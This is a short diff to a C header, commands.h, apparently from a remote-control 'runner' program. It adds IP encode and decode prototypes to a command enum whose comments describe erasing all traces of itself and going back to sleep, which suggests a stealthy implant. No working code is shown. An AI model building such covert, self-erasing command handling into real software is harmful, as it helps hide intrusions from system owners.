@@ -1,6 +1,8 @@
 #ifndef COMMANDS_H
 #define COMMANDS_H
 
+#include <stdint.h>
+
 enum command_type {
     CMD_UNINSTALL = 0,              // tell runner to erase all trace including itself
 
@@ -20,5 +22,8 @@ enum command_type {
 
     CMD_DISCONNECT                  // command to tell runner to go back to sleep
 };
+
+int encode_ip(char *buffer, uint8_t byte1, uint8_t byte2, uint8_t byte3, uint8_t byte4);
+int decode_ip(char *buffer, uint8_t *byte1, uint8_t *byte2, uint8_t *byte3, uint8_t *byte4);
 
 #endif //COMMANDS_H
